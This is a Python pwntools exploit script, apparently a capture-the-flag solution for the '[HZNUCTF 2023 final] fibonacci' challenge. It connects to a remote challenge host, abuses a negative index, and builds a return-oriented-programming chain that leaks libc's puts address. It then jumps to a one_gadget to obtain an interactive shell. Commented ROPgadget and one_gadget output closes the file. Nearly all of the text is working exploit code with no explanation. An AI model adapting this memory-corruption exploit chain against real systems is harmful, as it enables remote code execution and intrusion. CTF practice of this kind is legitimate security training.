from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])


# io=process("./[HZNUCTF 2023 final]fibonacci")
io=remote("node1.anna.nssctf.cn",28253)
elf=ELF("./[HZNUCTF 2023 final]fibonacci")
libc=ELF("./libc.so")

pop_rdi_ret=0x401a33
vuln=0x4019a2
puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
ret=0x40101a
one_gadget=[0xe3afe,0xe3b01,0xe3b04]
pop_r12_r13_r14_r15_ret=0x401a2c


io.sendlineafter("choice >> ",b"2")
io.sendlineafter("one?\n",b"-55")
io.sendlineafter(b"number\n",str(ret))

io.sendlineafter("choice >> ",b"2")
io.sendlineafter("one?\n",b"0")
payload=b"\x00"+b"a"*0x57+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendlineafter(b"number\n",payload)


leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"puts"]
print("leak_addr:  "+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b"system"]
str_bin_sh=leak_addr+next(libc.search(b"/bin/sh"))
shell=leak_addr+one_gadget[0]

io.sendlineafter("choice >> ",b"3")

io.sendlineafter("choice >> ",b"2")
io.sendlineafter("one?\n",b"1")
payload=b"\x00"+b"a"*0x57+p64(pop_r12_r13_r14_r15_ret)+p64(0)*4+p64(shell)
# gdb.attach(io)
# pause()
io.sendlineafter(b"number\n",payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a2e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a30 : pop r14 ; pop r15 ; ret
# 0x0000000000401a32 : pop r15 ; ret
# 0x0000000000401a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401a2f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040121d : pop rbp ; ret
# 0x00000000004016f6 : pop rbx ; pop rbp ; ret
# 0x0000000000401a33 : pop rdi ; ret
# 0x0000000000401a31 : pop rsi ; pop r15 ; ret
# 0x0000000000401a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x000000000040143f : ret 0x2474
# 0x00000000004017ba : ret 0x458b
# 0x00000000004015c3 : ret 0x850f
# 0x0000000000401580 : ret 0x858b
# 0x00000000004013d1 : ret 0x8d48
# 0x000000000040134d : ret 0xc

# Unique gadgets found: 18

# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

